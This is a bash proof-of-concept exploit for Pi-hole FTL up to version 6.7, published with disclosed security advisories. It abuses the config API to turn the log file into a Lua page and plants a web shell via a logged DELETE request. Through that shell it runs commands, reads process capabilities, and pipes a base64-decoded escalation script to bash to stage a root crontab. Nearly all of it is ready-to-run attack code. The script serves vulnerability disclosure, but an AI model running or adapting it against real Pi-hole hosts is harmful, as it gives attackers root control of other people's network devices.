#!/bin/bash
#
# LinnemanLabs - pi-hole logpoison+cap_chown, end-to-end web session to root code exec
#
# https://linnemanlabs.com/posts/pi-hole-root-with-extra-steps/
# https://github.com/linnemanlabs/advisories/
#
# logpoison lp advisory: https://github.com/pi-hole/FTL/security/advisories/GHSA-gx63-h4w6-f46g
# cap_chown advisory: https://github.com/pi-hole/pi-hole/security/advisories/GHSA-j8vh-6fp9-cjcx
#
# configuration options that are able to be set via API let the webroot
# point to an alternative path to execute our own .lp files. then we escalate
# to root with cap_chown.
#
# API: log paths -> webserver paths -> error log write -> GET x.lp -> exec
#
# works on FTL <= 6.7
#
PIHOST="http://pi.hole"
PIPASS="password"
PAYLOAD='<?lua mg.write(io.popen(mg.get_var(table.unpack{mg.request_info.query_string or ""; "cmd"}) or "id"):read("*a")) ?>'

do_cleanup=false
while (($#)); do
    case $1 in
        --cleanup) do_cleanup=true ;;
        *) printf 'unknown argument: %s\n' "$1" >&2; exit 2 ;;
    esac
    shift
done

if [ "${do_cleanup}" == "true" ];then
  trap do_cleanup EXIT
else
  echo "Skipping cleanup: to enable run with --cleanup"
fi

do_cleanup() {
  # clean-up
  echo "[*] cleaning up"

  # restore config
  webserverOpts='{"paths":{"webroot":"/var/www/html"},"serve_all":false}'
  echo "[*] restoring webserver paths and serve_all"
  res="$( curl -sk "${AUTH[@]}" -X PATCH ${PIHOST}/api/config -H "Content-Type: application/json" \
      -d "{\"config\":{\"webserver\":${webserverOpts}}}" )"
  resoptwr="$( echo "${res}" | jq -r ".config.webserver.paths.webroot" )"
  resoptsa="$( echo "${res}" | jq -r ".config.webserver.serve_all" )"
  if [ "${resoptwr}" == "/var/www/html" ];then
    echo "[+] pihole restored webroot config"
  else
    printf "[-] pihole did not restore webroot config option.\n[-] config.webserver.paths.webroot: ${resoptwr}\n[-] full response: ${res}\n"
  fi

  if [ "${resoptsa}" == "false" ];then
    echo "[+] pihole restored serve_all config"
  else
    printf "[-] pihole did not restore serve_all config option.\n[-] config.webserver.paths.webroot: ${resoptsa}\n[-] full response: ${res}\n"
  fi
  echo "[*] clean-up finished"

  echo "[*] Restoring log file locations"
  res="$( curl -sk "${AUTH[@]}" -X PATCH ${PIHOST}/api/config -H "Content-Type: application/json" \
      -d '{"config":{"files":{"log":{"ftl":"/var/log/pihole/FTL.log","webserver":"/var/log/pihole/webserver.log"}}}}' )"
  resoptftl="$( echo "${res}" | jq -r ".config.files.log.ftl" )"
  resoptwsl="$( echo "${res}" | jq -r ".config.files.log.webserver" )"
  if [ "${resoptwsl}" == "/var/log/pihole/webserver.log" ];then
    echo "[+] pihole restored our webserver log file change"
  else
    printf "[-] pihole did not restore our FTL log file config option.\n[-] config.files.log.webserver: ${resoptwsl}\n[-] full response: ${res}\n"
  fi

  if [ "${resoptftl}" == "/var/log/pihole/FTL.log" ];then
    echo "[+] pihole restored FTL log file change"
  else
    printf "[-] pihole did not restore our FTL log file config option.\n[-] config.files.log.ftl: ${resoptftl}\n[-] full response: ${res}\n"
  fi

  # left from the dev-branch PoC
  # echo "[*] Restoring RTC sync to false"
  # res="$( curl -sk "${AUTH[@]}" -X PATCH ${PIHOST}/api/config -H "Content-Type: application/json" \
  #     -d '{"config":{"ntp":{"sync":{"rtc":{"set":false}}}}}' )"
  # resoptrtc="$( echo "${res}" | jq -r ".config.ntp.sync.rtc.set" )"
  # if [ "${resoptrtc}" == "false" ];then
  #   echo "[+] pihole loaded our rtc config change"
  # else
  #   printf "[-] pihole did not set our rtc config option.\n[-] config.ntp.sync.rtc.set: ${resoptrtc}\n[-] full response: ${res}\n"
  #   exit 1
  # fi

  echo "[*] clean-up finished"
}

# authenticate (get a session id)
if [ "${PIPASS}x" != "x" ]; then
  SID="$( curl -sk -X POST ${PIHOST}/api/auth -H 'Content-Type: application/json' -d "{\"password\":\"${PIPASS}\"}" | jq -r .session.sid )"
  if [ "${SID}x" == "x" ];then
    echo "[-] cant create session with ${PIHOST} - is host up and password correct?"
    exit 1
  fi
  # using header auth, no CSRF token needed
  AUTH=(-H "X-FTL-SID: $SID")
  echo "[*] logged in, sid=${SID:0:8}…"
else
  AUTH=()
  echo "[*] using no-password mode"
fi

# change log file paths
echo "[*] Setting FTL and webserver log file locations"
res="$( curl -sk "${AUTH[@]}" -X PATCH ${PIHOST}/api/config -H "Content-Type: application/json" \
    -d '{"config":{"files":{"log":{"ftl":"/etc/pihole/x.lp","webserver":""}}}}' )"
resoptftl="$( echo "${res}" | jq -r ".config.files.log.ftl" )"
resoptwsl="$( echo "${res}" | jq -r ".config.files.log.webserver" )"
if [ "${resoptwsl}" == "" ];then
  echo "[+] pihole loaded our webserver log file change"
else
  printf "[-] pihole did not set our FTL log file config option.\n[-] config.files.log.webserver: ${resoptwsl}\n[-] full response: ${res}\n"
  exit 1
fi

if [ "${resoptftl}" == "/etc/pihole/x.lp" ];then
  echo "[+] pihole loaded our FTL log file change"
else
  printf "[-] pihole did not set our FTL log file config option.\n[-] config.files.log.ftl: ${resoptftl}\n[-] full response: ${res}\n"
  exit 1
fi

# set webroot to /
res="$( curl -sk "${AUTH[@]}" -X PATCH ${PIHOST}/api/config -H "Content-Type: application/json" \
    -d '{"config":{"webserver":{"paths":{"webroot":"/"},"serve_all":true}}}' )"
resoptwr="$( echo "${res}" | jq -r ".config.webserver.paths.webroot" )"
resoptsa="$( echo "${res}" | jq -r ".config.webserver.serve_all" )"
if [ "${resoptwr}" == "/" ];then
  echo "[+] pihole loaded our webroot config"
else
  printf "[-] pihole did not set our webroot config option.\n[-] config.webserver.paths.webroot: ${resoptwr}\n[-] full response: ${res}\n"
  exit 1
fi

echo "[*] sleeping for 10s to give FTL time to reload..";sleep 10

enclua=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=""))' "$PAYLOAD")
echo "[*] sending DELETE request to get our <?lua ... ?> logged unescaped"
res="$( curl -sk "${AUTH[@]}" -X DELETE "${PIHOST}/api/info/messages/${enclua}" -o /dev/null -w '%{http_code}\n' )"
if [ "${res}" == "404" ];then
  echo "[+] DELETE sent, 404 means it should (might?) be logged"
else
  echo "[-] DELETE sent, not the 404 response we expected: res: ${res}"
fi

echo "[*] checking if our lua worked"
# grep -A 20 in case you send lots of unrelated log lines over time
# my default payload prints 20 lines
#reslog="$( curl -sk "${PIHOST}/etc/pihole/x" | grep -A 20 WARNING )"
reslog="$( curl -sk "${PIHOST}/etc/pihole/x?cmd=id" | grep -ie uid )"
if [ "${reslog}x" == "x" ];then
  echo "[-] did not get uid output from cmd shell, check if /etc/pihole/x.lp exists on pihole box"
  exit 1
fi
echo "[*] result: ${reslog}"

# this was used for a fix-branch change, not needed anymore, preserved for now
# # enable rtc sync
# echo "[*] Enabling RTC sync to regain CAP_CHOWN"
# res="$( curl -sk "${AUTH[@]}" -X PATCH ${PIHOST}/api/config -H "Content-Type: application/json" \
#     -d '{"config":{"ntp":{"sync":{"rtc":{"set":true}}}}}' )"
# resoptrtc="$( echo "${res}" | jq -r ".config.ntp.sync.rtc.set" )"
# if [ "${resoptrtc}" == "true" ];then
#   echo "[+] pihole loaded our rtc config change"
# else
#   printf "[-] pihole did not set our rtc config option.\n[-] config.ntp.sync.rtc.set: ${resoptrtc}\n[-] full response: ${res}\n"
#   exit 1
# fi

# # restart FTL for caps. kill it so systemd restarts with full caps
# echo "[*] killing ftl so systemd restarts with full caps"
# reslog="$( curl -sk --url-query "cmd=pkill -9 pihole-FTL" "${PIHOST}/etc/pihole/x" | grep -ie kill )"
# #echo "[*] result: ${reslog}"
# echo "[*] sleeping for 10s to give FTL time to restart..";sleep 10

# check for cap_chown in our current caps
reslog="$( curl -sk --url-query "cmd=cat /proc/self/status" "${PIHOST}/etc/pihole/x" | grep -ie CapEff | awk '{ print $2 }' )"
if [ "${reslog}x" == "x" ];then
 echo "[-] did not get current caps from cmd shell. is cmd shell still up?"
 exit 1
fi
echo "[*] Current effective caps: ${reslog}"
decoded="$( capsh --decode="${reslog}" )"
echo "[*] decoded caps: ${decoded}"
# if [[ "${decoded}" != *"cap_chown"* ]];then
#  echo "[-] no cap_chown in current caps: ${decoded}"
# fi

echo "[*] running privilege escalation"
# run privesc.sh
if [ ! -f "privesc.sh" ];then
  echo "[-] missing privesc.sh - clone from https://github.com/linnemanlabs/advisories"
  exit 1
fi

privb64="$( cat privesc.sh | base64 -w0 )"
rcmd='echo "'${privb64}'"|base64 -d|bash'
reslog="$( curl -sk --url-query "cmd=${rcmd}" "${PIHOST}/etc/pihole/x" )"

if [[ "${reslog}" == *"root crontab staged. command will run within"* ]];then
  echo "[+] Escalation succeeded, waiting for root proof within 60seconds.."
  echo "[*] sleeping for 70 seconds to check for cron exec..";sleep 70
  res="$( curl -sk --url-query "cmd=cat /tmp/root-exec" "${PIHOST}/etc/pihole/x" | grep -ve INFO -ve ERROR )"
  if [[ "${res}" == *"uid=0"* ]];then
    echo "[+] success, root exec"
    echo "full log: ${res}"
  else
    echo "[-] did not find uid=0 in /tmp/root-exec"
    echo "[-] are you running a vulnerable version (<= 6.7)?"
    echo "[-] check if crontab staged properly, check if cron picked up crontab refresh"
    echo "[-] - if not then try crontab -e as pihole to change directory mtime"
    echo "[-]"
    echo "[-] try the other non-exec LPEs (gravity chown, file-disclosures, etc)"
    exit 1
  fi
else
  echo "[-] crontab not staged, check the full log"
  echo "log: ${reslog}"
fi
